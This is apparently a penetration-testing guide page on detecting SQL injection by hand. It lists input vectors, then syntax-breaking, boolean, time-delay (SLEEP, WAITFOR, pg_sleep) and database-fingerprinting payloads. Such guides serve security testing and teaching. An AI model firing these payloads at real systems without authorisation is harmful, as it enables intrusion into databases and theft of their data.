---
title: 'Identifying SQL Injection Vulnerabilities'
description: 'How to systematically test for SQL injection manually, where to look, basic payloads for detection, and database fingerprinting.'
icon: material/magnify-scan
tags:
  - sql-injection
  - identification
  - manual-testing
---

# Identifying SQL Injection Vulnerabilities

Before exploitation, you must systematically **detect** injectable parameters. Manual testing is often required because automated tools like SQLMap might miss obscure injection points or be blocked by Web Application Firewalls (WAFs).

---

## Step 1: Find Injection Points

Test **every** user-controllable input. SQL injection is not limited to search bars and login forms.

| Input Vector | Example | Why it's vulnerable |
|---|---|---|
| URL parameters | `https://target.com/items?id=1` | Direct input to database lookups |
| POST body fields | `username=admin&password=test` | Often used in authentication or data insertion |
| HTTP Headers | `Cookie:`, `User-Agent:`, `X-Forwarded-For:` | Server might log these values to the database |
| JSON/XML bodies | `{"id": "1", "name": "test"}` | APIs often parse JSON directly into SQL queries |
| REST API Paths | `https://target.com/api/users/1/profile` | The `1` is often a direct parameter |
| Hidden Fields | `<input type="hidden" name="role" value="user">` | Attackers can easily intercept and modify these |

---

## Step 2: Inject Test Payloads

Once you've identified an input vector, inject probes designed to trigger SQL errors or behavioral changes.

### Basic Detection Payloads (Error Triggers)

The simplest way to detect SQLi is to break the query's syntax.

```text title="Syntax Breakers"
'
"
`
')
")
`)
'))
"))
`))
\
```

If the application returns a database error (e.g., `You have an error in your SQL syntax...`), you have found an injection point!

### Logical Test Payloads (Behavioral Triggers)

If the application suppresses errors, test for logical changes.

```text title="Boolean True"
-- These should return the SAME result as the original page:
1 OR 1=1
1' OR '1'='1
1" OR "1"="1
1 OR 1=1--
1 OR 1=1#
1 OR 1=1/*
```

```text title="Boolean False"
-- These should return a DIFFERENT or empty result:
1 AND 1=2
1' AND '1'='2
1" AND "1"="2
1 AND 1=2--
```

If the `TRUE` payload loads the normal page, but the `FALSE` payload loads an empty or different page, you have found **Boolean-Based Blind SQLi**.

### Time-Based Detection

If the page looks identical regardless of true/false conditions, inject time delays.

```text title="Time Delays"
'; WAITFOR DELAY '0:0:5'--       -- MSSQL
' AND SLEEP(5)--                 -- MySQL
' AND pg_sleep(5)--              -- PostgreSQL
1; SELECT SLEEP(5)               -- MySQL (stacked)
```

If the page consistently takes exactly 5 seconds longer to load with the payload, you have found **Time-Based Blind SQLi**.

---

## Step 3: Determine the Database Type

Once injection is confirmed, you must fingerprint the Database Management System (DBMS) to tailor your exploits.

### Version Query Fingerprinting

Inject queries that ask the database for its version.

| Payload | DBMS |
|---|---|
| `' AND @@version--` | **MySQL**, **MSSQL** |
| `' AND version()--` | **PostgreSQL**, **MySQL** |
| `' UNION SELECT banner FROM v$version--` | **Oracle** |
| `' UNION SELECT sqlite_version()--` | **SQLite** |

### String Concatenation Fingerprinting

Different databases use different syntax for string concatenation. You can use this to fingerprint the DBMS blindly.

```sql title="String Concatenation Tests"
-- If this works, it's MySQL or PostgreSQL (using standard SQL)
' 'admin' '

-- If this works, it's Oracle, PostgreSQL, or SQLite
'admin'||'rator'

-- If this works, it's MSSQL
'admin'+'rator'

-- If this works, it's MySQL
CONCAT('admin', 'rator')
```

If injecting `'admin'||'rator'` successfully logs you in as `administrator`, you know you're likely dealing with Oracle or PostgreSQL.
